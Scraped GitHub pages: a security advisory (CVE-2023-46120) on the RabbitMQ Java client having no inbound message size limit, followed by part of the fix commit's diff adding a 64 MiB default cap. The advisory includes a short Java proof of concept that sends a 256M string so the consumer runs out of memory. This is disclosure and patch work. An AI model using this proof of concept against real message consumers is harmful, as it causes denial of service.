=== Content from github.com_477d77b7_20250111_012752.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frabbitmq%2Frabbitmq-java-client%2Fsecurity%2Fadvisories%2FGHSA-mm8h-8587-p46h)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frabbitmq%2Frabbitmq-java-client%2Fsecurity%2Fadvisories%2FGHSA-mm8h-8587-p46h)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=rabbitmq%2Frabbitmq-java-client)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rabbitmq](/rabbitmq)
/
**[rabbitmq-java-client](/rabbitmq/rabbitmq-java-client)**
Public

* [Notifications](/login?return_to=%2Frabbitmq%2Frabbitmq-java-client) You must be signed in to change notification settings
* [Fork
  577](/login?return_to=%2Frabbitmq%2Frabbitmq-java-client)
* [Star
   1.3k](/login?return_to=%2Frabbitmq%2Frabbitmq-java-client)

* [Code](/rabbitmq/rabbitmq-java-client)
* [Issues
  19](/rabbitmq/rabbitmq-java-client/issues)
* [Pull requests
  2](/rabbitmq/rabbitmq-java-client/pulls)
* [Discussions](/rabbitmq/rabbitmq-java-client/discussions)
* [Actions](/rabbitmq/rabbitmq-java-client/actions)
* [Security](/rabbitmq/rabbitmq-java-client/security)
* [Insights](/rabbitmq/rabbitmq-java-client/pulse)

Additional navigation options

* [Code](/rabbitmq/rabbitmq-java-client)
* [Issues](/rabbitmq/rabbitmq-java-client/issues)
* [Pull requests](/rabbitmq/rabbitmq-java-client/pulls)
* [Discussions](/rabbitmq/rabbitmq-java-client/discussions)
* [Actions](/rabbitmq/rabbitmq-java-client/actions)
* [Security](/rabbitmq/rabbitmq-java-client/security)
* [Insights](/rabbitmq/rabbitmq-java-client/pulse)

# No message size limit in RabbitMQ Java client can lead to a remote DoS attack of consumer applications

Moderate

[michaelklishin](/michaelklishin)
published
GHSA-mm8h-8587-p46h
Oct 23, 2023

## Package

erlang

org.springframework.amqp.rabbit.listener.DirectMessageListenerContainer.java
([Erlang](/advisories?query=ecosystem%3Aerlang))

## Affected versions

< 5.18.0

## Patched versions

None

## Description

### Summary

`maxBodyLebgth` was not used when receiving Message objects. Attackers could just send a very large Message causing a memory overflow and triggering an OOM Error.

### Details

in file: org.springframework.amqp.rabbit.listener.DirectMessageListenerContainer.java

[![image](https://user-images.githubusercontent.com/23692514/277080576-10adae1b-922f-4270-8272-dc1cb9a4e2ac.png)](https://user-images.githubusercontent.com/23692514/277080576-10adae1b-922f-4270-8272-dc1cb9a4e2ac.png)

### PoC

#### RbbitMQ

* Use RabbitMQ 3.11.16 as MQ and specify Message Body size 512M (here it only needs to be larger than the Consumer memory)
* Start RabbitMQ

#### Producer

* Build a String of length 256M and send it to Consumer

```
package org.springframework.amqp.helloworld;

import org.springframework.amqp.core.AmqpTemplate;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;

public class Producer {
    public static void main(String[] args) {
        ApplicationContext context = new AnnotationConfigApplicationContext(HelloWorldConfiguration.class);
        AmqpTemplate amqpTemplate = context.getBean(AmqpTemplate.class);
        String s = "A";
        for(int i=0;i<28;++i){
            s = s + s;
            System.out.println(i);
        }
        amqpTemplate.convertAndSend(s);
        System.out.println("Send Finish");
    }
 }

```
#### Consumer

* First set the heap memory size to 128M
* Read the message sent by the Producer from the MQ and print the length

```
package org.springframework.amqp.helloworld;

import org.springframework.amqp.core.AmqpTemplate;
import org.springframework.amqp.core.Message;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;

public class Consumer {

    public static void main(String[] args) {
        ApplicationContext context = new AnnotationConfigApplicationContext(HelloWorldConfiguration.class);
        AmqpTemplate amqpTemplate = context.getBean(AmqpTemplate.class);
        Object o = amqpTemplate.receiveAndConvert();
        if(o != null){
            String s = o.toString();
            System.out.println("Received Length : " + s.length());
        }else{
            System.out.println("null");
        }
    }
}

```
#### Results

* Run the Producer first, then the Consumer
* Consumer throws OOM Exception

  [![image](https://user-images.githubusercontent.com/23692514/277081304-82789579-976d-4c46-98c8-27c88a6cba88.png)](https://user-images.githubusercontent.com/23692514/277081304-82789579-976d-4c46-98c8-27c88a6cba88.png)

### Impact

Users of RabbitMQ may suffer from DoS attacks from RabbitMQ Java client which will ultimately exhaust the memory of the consumer.

### Severity

Moderate

4.9

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
High

User interaction
None

Scope
Unchanged

Confidentiality
None

Integrity
None

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H

### CVE ID

CVE-2023-46120

### Weaknesses

[CWE-400](/advisories?query=cwe%3A400)

### Credits

* [![@LianKee](https://avatars.githubusercontent.com/u/23692514?s=40&v=4)](/LianKee)
  [LianKee](/LianKee)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_017526e0_20250111_012750.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frabbitmq%2Frabbitmq-java-client%2Fcommit%2F714aae602dcae6cb4b53cadf009323ebac313cc8)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frabbitmq%2Frabbitmq-java-client%2Fcommit%2F714aae602dcae6cb4b53cadf009323ebac313cc8)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=rabbitmq%2Frabbitmq-java-client)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rabbitmq](/rabbitmq)
/
**[rabbitmq-java-client](/rabbitmq/rabbitmq-java-client)**
Public

* [Notifications](/login?return_to=%2Frabbitmq%2Frabbitmq-java-client) You must be signed in to change notification settings
* [Fork
  577](/login?return_to=%2Frabbitmq%2Frabbitmq-java-client)
* [Star
   1.3k](/login?return_to=%2Frabbitmq%2Frabbitmq-java-client)

* [Code](/rabbitmq/rabbitmq-java-client)
* [Issues
  19](/rabbitmq/rabbitmq-java-client/issues)
* [Pull requests
  2](/rabbitmq/rabbitmq-java-client/pulls)
* [Discussions](/rabbitmq/rabbitmq-java-client/discussions)
* [Actions](/rabbitmq/rabbitmq-java-client/actions)
* [Security](/rabbitmq/rabbitmq-java-client/security)
* [Insights](/rabbitmq/rabbitmq-java-client/pulse)

Additional navigation options

* [Code](/rabbitmq/rabbitmq-java-client)
* [Issues](/rabbitmq/rabbitmq-java-client/issues)
* [Pull requests](/rabbitmq/rabbitmq-java-client/pulls)
* [Discussions](/rabbitmq/rabbitmq-java-client/discussions)
* [Actions](/rabbitmq/rabbitmq-java-client/actions)
* [Security](/rabbitmq/rabbitmq-java-client/security)
* [Insights](/rabbitmq/rabbitmq-java-client/pulse)

## Commit

[Permalink](/rabbitmq/rabbitmq-java-client/commit/714aae602dcae6cb4b53cadf009323ebac313cc8)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Add max inbound message size to ConnectionFactory

[Browse files](/rabbitmq/rabbitmq-java-client/tree/714aae602dcae6cb4b53cadf009323ebac313cc8)
Browse the repository at this point in the history

```
To avoid OOM with a very large message.
The default value is 64 MiB.

Fixes [#1062](https://github.com/rabbitmq/rabbitmq-java-client/issues/1062)

(cherry picked from commit [9ed45fd](https://github.com/rabbitmq/rabbitmq-java-client/commit/9ed45fde52224ec74fc523321efdf9a157d5cfca))
```

* Loading branch information

[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&v=4)](/acogoluegnes)

[acogoluegnes](/rabbitmq/rabbitmq-java-client/commits?author=acogoluegnes "View all commits by acogoluegnes")
committed
Jun 15, 2023

1 parent
[83cf551](/rabbitmq/rabbitmq-java-client/commit/83cf551fb0142f7a5d042bd54e0cf3c1e47ed419)

commit 714aae6

 Show file tree

 Hide file tree

Showing
**17 changed files**
with
**282 additions**
and
**48 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* src

  + main/java/com/rabbitmq/client

    - src/main/java/com/rabbitmq/client/ConnectionFactory.java
      [ConnectionFactory.java](#diff-045e321e0fb12f11085653a7ed09f16518f9f21a7c80990c30720958dc17e954)
    - impl

      * src/main/java/com/rabbitmq/client/impl/AMQChannel.java
        [AMQChannel.java](#diff-81c1dc5e14b3c7ef16c1fd8a888cfc331bd057859d87cd362d81374eb9a8caae)
      * src/main/java/com/rabbitmq/client/impl/AMQCommand.java
        [AMQCommand.java](#diff-457523d90e4aaa192b3b71e52de070aeb5bb9aca9a43492d356668f27caf5ed9)
      * src/main/java/com/rabbitmq/client/impl/AMQConnection.java
        [AMQConnection.java](#diff-638d5fe97be440e0460a46c34c56997f57f0396493ddae0f931a5e69906c3867)
      * src/main/java/com/rabbitmq/client/impl/AbstractFrameHandlerFactory.java
        [AbstractFrameHandlerFactory.java](#diff-956983c207dcd76844a361c9d33507646b62fcb1edf4968ba76b2261c33a9ca3)
      * src/main/java/com/rabbitmq/client/impl/CommandAssembler.java
        [CommandAssembler.java](#diff-61a80909ae65e4ec3ef1075d422ab4cb704cf5ac0c7f2bb266eee2c014d1e5e8)
      * src/main/java/com/rabbitmq/client/impl/ConnectionParams.java
        [ConnectionParams.java](#diff-2a0c4c02d92c0f927098f0076b3c175f0814a46a246be57968c212c1aaa3fc1f)
      * src/main/java/com/rabbitmq/client/impl/Frame.java
        [Frame.java](#diff-ed0b9c599d7d8b63dc628d1f2b2153099072fc732877267fc1a752addeb7048c)
      * src/main/java/com/rabbitmq/client/impl/SocketFrameHandler.java
        [SocketFrameHandler.java](#diff-789e5d3b6f822fd94d8f83393059a754817405059bea5ad98d33a494af649f7f)
      * src/main/java/com/rabbitmq/client/impl/SocketFrameHandlerFactory.java
        [SocketFrameHandlerFactory.java](#diff-c032450d14f76d4fa34cfab583d58a93c03e938a98755bbe34777f5dfb0e6323)
      * nio

        + src/main/java/com/rabbitmq/client/impl/nio/FrameBuilder.java
          [FrameBuilder.java](#diff-cbe350983fa360a562b0e3b1fbab28405169e76332ae6c22d687c43916a21dc3)
        + src/main/java/com/rabbitmq/client/impl/nio/SocketChannelFrameHandlerFactory.java
          [SocketChannelFrameHandlerFactory.java](#diff-5c2be42f8e857d6c231f610e8612934fde729d7f240838f90a284cdc78550fd9)
        + src/main/java/com/rabbitmq/client/impl/nio/SocketChannelFrameHandlerState.java
          [SocketChannelFrameHandlerState.java](#diff-c39da99a4df31a502b0e085b94663def6ec6354bf75a4e1e927c4667112549ef)
        + src/main/java/com/rabbitmq/client/impl/nio/SslEngineFrameBuilder.java
          [SslEngineFrameBuilder.java](#diff-cd640bfc5f6c713e9657f9032c6546c6b92d4eefbbdf5c89621a1671fa71a35f)
  + test/java/com/rabbitmq/client/test

    - src/test/java/com/rabbitmq/client/test/FrameBuilderTest.java
      [FrameBuilderTest.java](#diff-778a59de6594f2f06443323ae71ce0fb454f4695ac1239068f1321df962df490)
    - src/test/java/com/rabbitmq/client/test/MaxInboundMessageSizeTest.java
      [MaxInboundMessageSizeTest.java](#diff-0b451fc12081741d74b015c7bd1987e764027fa23ca146c4e7ceb3ac2a7e1be0)
    - src/test/java/com/rabbitmq/client/test/TestUtils.java
      [TestUtils.java](#diff-55247eba66a3c05272767cb77eccd7acdadf01e9e0f429779b22b4b4320fb79c)

## There are no files selected for viewing

33 changes: 30 additions & 3 deletions

33
[src/main/java/com/rabbitmq/client/ConnectionFactory.java](#diff-045e321e0fb12f11085653a7ed09f16518f9f21a7c80990c30720958dc17e954 "src/main/java/com/rabbitmq/client/ConnectionFactory.java")

Show comments

[View file](/rabbitmq/rabbitmq-java-client/blob/714aae602dcae6cb4b53cadf009323ebac313cc8/src/main/java/com/rabbitmq/client/ConnectionFactory.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | // Copyright (c) 2007-2020 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // Copyright (c) 2007-2023 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // |
|  |  | // This software, the RabbitMQ Java client library, is triple-licensed under the |
|  |  | // Mozilla Public License 2.0 ("MPL"), the GNU General Public License version 2 |
| Expand Down  Expand Up | | @@ -205,6 +205,13 @@ public class ConnectionFactory implements Cloneable { |
|  |  |  |
|  |  | private CredentialsRefreshService credentialsRefreshService; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Maximum body size of inbound (received) messages in bytes. |
|  |  | \* |
|  |  | \* <p>Default value is 67,108,864 (64 MiB). |
|  |  | \*/ |
|  |  | private int maxInboundMessageBodySize = 1\_048\_576 \* 64; |
|  |  |  |
|  |  | /\*\* @return the default host to use for connections \*/ |
|  |  | public String getHost() { |
|  |  | return host; |
| Expand Down  Expand Up | | @@ -970,11 +977,15 @@ protected synchronized FrameHandlerFactory createFrameHandlerFactory() throws IO |
|  |  | if(this.nioParams.getNioExecutor() == null && this.nioParams.getThreadFactory() == null) { |
|  |  | this.nioParams.setThreadFactory(getThreadFactory()); |
|  |  | } |
|  |  | this.frameHandlerFactory = new SocketChannelFrameHandlerFactory(connectionTimeout, nioParams, isSSL(), sslContextFactory); |
|  |  | this.frameHandlerFactory = new SocketChannelFrameHandlerFactory( |
|  |  | connectionTimeout, nioParams, isSSL(), sslContextFactory, |
|  |  | this.maxInboundMessageBodySize); |
|  |  | } |
|  |  | return this.frameHandlerFactory; |
|  |  | } else { |
|  |  | return new SocketFrameHandlerFactory(connectionTimeout, socketFactory, socketConf, isSSL(), this.shutdownExecutor, sslContextFactory); |
|  |  | return new SocketFrameHandlerFactory(connectionTimeout, socketFactory, |
|  |  | socketConf, isSSL(), this.shutdownExecutor, sslContextFactory, |
|  |  | this.maxInboundMessageBodySize); |
|  |  | } |
|  |  |  |
|  |  | } |
| Expand Down  Expand Up | | @@ -1273,6 +1284,7 @@ public ConnectionParams params(ExecutorService consumerWorkServiceExecutor) { |
|  |  | result.setRecoveredQueueNameSupplier(recoveredQueueNameSupplier); |
|  |  | result.setTrafficListener(trafficListener); |
|  |  | result.setCredentialsRefreshService(credentialsRefreshService); |
|  |  | result.setMaxInboundMessageBodySize(maxInboundMessageBodySize); |
|  |  | return result; |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -1556,6 +1568,21 @@ public int getChannelRpcTimeout() { |
|  |  | return channelRpcTimeout; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Maximum body size of inbound (received) messages in bytes. |
|  |  | \* |
|  |  | \* <p>Default value is 67,108,864 (64 MiB). |
|  |  | \* |
|  |  | \* @param maxInboundMessageBodySize the maximum size of inbound messages |
|  |  | \*/ |
|  |  | public void setMaxInboundMessageBodySize(int maxInboundMessageBodySize) { |
|  |  | if (maxInboundMessageBodySize <= 0) { |
|  |  | throw new IllegalArgumentException("Max inbound message body size must be greater than 0: " |
|  |  | + maxInboundMessageBodySize); |
|  |  | } |
|  |  | this.maxInboundMessageBodySize = maxInboundMessageBodySize; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* The factory to create SSL contexts. |
|  |  | \* This provides more flexibility to create {@link SSLContext}s |
| Expand Down | |  |

9 changes: 6 additions & 3 deletions

9
[src/main/java/com/rabbitmq/client/impl/AMQChannel.java](#diff-81c1dc5e14b3c7ef16c1fd8a888cfc331bd057859d87cd362d81374eb9a8caae "src/main/java/com/rabbitmq/client/impl/AMQChannel.java")

Show comments

[View file](/rabbitmq/rabbitmq-java-client/blob/714aae602dcae6cb4b53cadf009323ebac313cc8/src/main/java/com/rabbitmq/client/impl/AMQChannel.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | // Copyright (c) 2007-2020 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // Copyright (c) 2007-2023 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // |
|  |  | // This software, the RabbitMQ Java client library, is triple-licensed under the |
|  |  | // Mozilla Public License 2.0 ("MPL"), the GNU General Public License version 2 |
| Expand Down  Expand Up | | @@ -62,7 +62,7 @@ public abstract class AMQChannel extends ShutdownNotifierComponent { |
|  |  | private final int \_channelNumber; |
|  |  |  |
|  |  | /\*\* Command being assembled \*/ |
|  |  | private AMQCommand \_command = new AMQCommand(); |
|  |  | private AMQCommand \_command; |
|  |  |  |
|  |  | /\*\* The current outstanding RPC request, if any. (Could become a queue in future.) \*/ |
|  |  | private RpcWrapper \_activeRpc = null; |
| Expand All | | @@ -76,6 +76,7 @@ public abstract class AMQChannel extends ShutdownNotifierComponent { |
|  |  | private final boolean \_checkRpcResponseType; |
|  |  |  |
|  |  | private final TrafficListener \_trafficListener; |
|  |  | private final int maxInboundMessageBodySize; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Construct a channel on the given connection, with the given channel number. |
| Expand All | | @@ -91,6 +92,8 @@ public AMQChannel(AMQConnection connection, int channelNumber) { |
|  |  | this.\_rpcTimeout = connection.getChannelRpcTimeout(); |
|  |  | this.\_checkRpcResponseType = connection.willCheckRpcResponseType(); |
|  |  | this.\_trafficListener = connection.getTrafficListener(); |
|  |  | this.maxInboundMessageBodySize = connection.getMaxInboundMessageBodySize(); |
|  |  | this.\_command = new AMQCommand(this.maxInboundMessageBodySize); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
| Expand All | | @@ -110,7 +113,7 @@ public int getChannelNumber() { |
|  |  | public void handleFrame(Frame frame) throws IOException { |
|  |  | AMQCommand command = \_command; |
|  |  | if (command.handleFrame(frame)) { // a complete command has rolled off the assembly line |
|  |  | \_command = new AMQCommand(); // prepare for the next one |
|  |  | \_command = new AMQCommand(this.maxInboundMessageBodySize); // prepare for the next one |
|  |  | handleCompleteInboundCommand(command); |
|  |  | } |
|  |  | } |
| Expand Down | |  |

24 changes: 20 additions & 4 deletions

24
[src/main/java/com/rabbitmq/client/impl/AMQCommand.java](#diff-457523d90e4aaa192b3b71e52de070aeb5bb9aca9a43492d356668f27caf5ed9 "src/main/java/com/rabbitmq/client/impl/AMQCommand.java")

Show comments

[View file](/rabbitmq/rabbitmq-java-client/blob/714aae602dcae6cb4b53cadf009323ebac313cc8/src/main/java/com/rabbitmq/client/impl/AMQCommand.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | // Copyright (c) 2007-2020 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // Copyright (c) 2007-2023 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // |
|  |  | // This software, the RabbitMQ Java client library, is triple-licensed under the |
|  |  | // Mozilla Public License 2.0 ("MPL"), the GNU General Public License version 2 |
| Expand Down  Expand Up | | @@ -44,17 +44,21 @@ public class AMQCommand implements Command { |
|  |  | /\*\* The assembler for this command - synchronised on - contains all the state \*/ |
|  |  | private final CommandAssembler assembler; |
|  |  |  |
|  |  | AMQCommand(int maxBodyLength) { |
|  |  | this(null, null, null, maxBodyLength); |
|  |  | } |
|  |  |  |
|  |  | /\*\* Construct a command ready to fill in by reading frames \*/ |
|  |  | public AMQCommand() { |
|  |  | this(null, null, null); |
|  |  | this(null, null, null, Integer.MAX\_VALUE); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Construct a command with just a method, and without header or body. |
|  |  | \* @param method the wrapped method |
|  |  | \*/ |
|  |  | public AMQCommand(com.rabbitmq.client.Method method) { |
|  |  | this(method, null, null); |
|  |  | this(method, null, null, Integer.MAX\_VALUE); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
| Expand All | | @@ -64,7 +68,19 @@ public AMQCommand(com.rabbitmq.client.Method method) { |
|  |  | \* @param body the message body data |
|  |  | \*/ |
|  |  | public AMQCommand(com.rabbitmq.client.Method method, AMQContentHeader contentHeader, byte[] body) { |
|  |  | this.assembler = new CommandAssembler((Method) method, contentHeader, body); |
|  |  | this.assembler = new CommandAssembler((Method) method, contentHeader, body, Integer.MAX\_VALUE); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Construct a command with a specified method, header and body. |
|  |  | \* @param method the wrapped method |
|  |  | \* @param contentHeader the wrapped content header |
|  |  | \* @param body the message body data |
|  |  | \* @param maxBodyLength the maximum size for an inbound message body |
|  |  | \*/ |
|  |  | public AMQCommand(com.rabbitmq.client.Method method, AMQContentHeader contentHeader, byte[] body, |
|  |  | int maxBodyLength) { |
|  |  | this.assembler = new CommandAssembler((Method) method, contentHeader, body, maxBodyLength); |
|  |  | } |
|  |  |  |
|  |  | /\*\* Public API - {@inheritDoc} \*/ |
| Expand Down | |  |

7 changes: 7 additions & 0 deletions

7
[src/main/java/com/rabbitmq/client/impl/AMQConnection.java](#diff-638d5fe97be440e0460a46c34c56997f57f0396493ddae0f931a5e69906c3867 "src/main/java/com/rabbitmq/client/impl/AMQConnection.java")

Show comments

[View file](/rabbitmq/rabbitmq-java-client/blob/714aae602dcae6cb4b53cadf009323ebac313cc8/src/main/java/com/rabbitmq/client/impl/AMQConnection.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -157,6 +157,7 @@ public static Map<String, Object> defaultClientProperties() { |
|  |  | private volatile ChannelManager \_channelManager; |
|  |  | /\*\* Saved server properties field from connection.start \*/ |
|  |  | private volatile Map<String, Object> \_serverProperties; |
|  |  | private final int maxInboundMessageBodySize; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Protected API - respond, in the driver thread, to a ShutdownSignal. |
| Expand Down  Expand Up | | @@ -244,6 +245,7 @@ public AMQConnection(ConnectionParams params, FrameHandler frameHandler, Metrics |
|  |  |  |
|  |  | this.credentialsRefreshService = params.getCredentialsRefreshService(); |
|  |  |  |
